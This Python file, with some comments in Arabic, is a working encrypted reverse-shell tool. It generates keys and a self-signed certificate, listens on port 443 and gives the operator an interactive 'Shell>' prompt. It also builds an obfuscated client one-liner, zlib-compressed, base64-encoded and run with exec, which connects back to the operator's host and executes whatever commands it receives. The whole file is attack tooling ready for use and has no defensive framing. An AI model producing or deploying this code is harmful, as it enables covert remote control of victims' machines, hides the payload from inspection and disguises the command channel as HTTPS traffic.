import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
import zlib
from threading import Thread
import hmac
import hashlib
from Crypto.PublicKey import RSA  # تأكد من تثبيت pycryptodome

def keys_check_or_create(ip_address, password):
    """
    Generate keys and embed password in client code
    """
    keys_dir = "keys"
    os.makedirs(keys_dir, exist_ok=True)

    # Remove existing keys
    for file in os.listdir(keys_dir):
        file_path = os.path.join(keys_dir, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
    print("[*] Existing keys removed.")

    # Generate RSA keys
    key = RSA.generate(2048)
    
    # Save private key
    private_key_path = os.path.join(keys_dir, "private_key.pem")
    with open(private_key_path, "wb") as f:
        f.write(key.export_key())
    
    # Save public key
    public_key_path = os.path.join(keys_dir, "public_key.pem")
    with open(public_key_path, "wb") as f:
        f.write(key.publickey().export_key())
    
    # Generate certificate
    cert_path = os.path.join(keys_dir, "server.crt")
    generate_certificate(private_key_path, cert_path, ip_address)  # تمت إضافة الاستدعاء الصحيح هنا
    
    # Generate client code with password
    compressed_client_code = generate_and_compress_client_code(ip_address, 443, password)
    print("\n[--- One-Liner Client Code ---]")
    print(f"python -c \"{compressed_client_code}\"")
    print("[--- End of Client Code ---]\n")

    return cert_path, private_key_path

def generate_certificate(private_key_path, cert_path, ip_address):
    """
    Generate self-signed certificate (الدالة المفقودة)
    """
    openssl_config = "openssl.cnf"
    
    # Create OpenSSL config file
    with open(openssl_config, "w") as f:
        f.write(f"""
[ req ]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = SanFrancisco
O = MyOrg
OU = IT
CN = {ip_address}

[ v3_req ]
subjectAltName = @alt_names

[ alt_names ]
IP.1 = {ip_address}
""")
    
    try:
        # Generate certificate using OpenSSL
        run([
            "openssl", "req", "-new", "-x509",
            "-key", private_key_path,
            "-out", cert_path,
            "-days", "365",
            "-config", openssl_config
        ], check=True)
        print("[*] Certificate generated successfully")
    except CalledProcessError as e:
        print(f"[!] OpenSSL error: {e}")
    finally:
        if os.path.exists(openssl_config):
            os.remove(openssl_config)

def generate_and_compress_client_code(ip, port, password):
    """
    Generate client code with authentication logic
    """
    certfile = os.path.join("keys", "server.crt")
    with open(certfile, "r") as f:
        cert_content = f.read()

    client_code = f"""
import socket, ssl, subprocess, hmac, hashlib
CERT=\"\"\"{cert_content}\"\"\"
PASSWORD = b"{password}"
def connect():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    try:
        with socket.create_connection(("{ip}", {port})) as sock:
            with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
                # Authentication phase
                nonce = ssock.recv(16)
                hmac_res = hmac.new(PASSWORD, nonce, hashlib.sha256).digest()
                ssock.send(hmac_res)
                auth_status = ssock.recv(12)
                if auth_status != b"AUTH_SUCCESS":
                    raise Exception("Authentication failed")
                # Command loop
                while True:
                    cmd = ssock.recv(8192).decode()
                    if cmd.lower() == "exit":
                        break
                    output = subprocess.getoutput(cmd)
                    ssock.sendall(output.encode())
    except Exception as e:
        print(f"Connection error: {{e}}")
connect()
"""

    # Compress and encode
    compressed = zlib.compress(client_code.encode())
    return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{base64.b64encode(compressed).decode()}')))"

def handle_client(client_socket, password):
    """
    Handle client authentication and commands
    """
    try:
        # Send challenge
        nonce = os.urandom(16)
        client_socket.send(nonce)
        
        # Get response
        hmac_res = client_socket.recv(32)
        
        # Verify HMAC
        correct_hmac = hmac.new(password.encode(), nonce, hashlib.sha256).digest()
        if not hmac.compare_digest(hmac_res, correct_hmac):
            client_socket.send(b"AUTH_FAILED")
            raise Exception("Authentication failed")
        
        client_socket.send(b"AUTH_SUCCESS")
        print("[+] Client authenticated")
        
        # Command loop
        while True:
            cmd = input("Shell> ").strip()
            if not cmd:
                continue
            client_socket.send(cmd.encode())
            if cmd.lower() in ["exit", "quit"]:
                break
            output = client_socket.recv(8192).decode()
            print(output)
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def start_server(ip, port, password):
    """
    Start server with authentication
    """
    cert, key = keys_check_or_create(ip, password)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert, keyfile=key)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((ip, port))
        sock.listen(5)
        print(f"[*] Listening on {ip}:{port}")
        
        with context.wrap_socket(sock, server_side=True) as ssock:
            while True:
                client, addr = ssock.accept()
                print(f"[+] Connection from {addr}")
                Thread(target=handle_client, args=(client, password)).start()

if __name__ == "__main__":
    server_ip = input("[!] Enter server IP: ").strip()
    password = input("[!] Set authentication password: ").strip()
    start_server(server_ip, 443, password)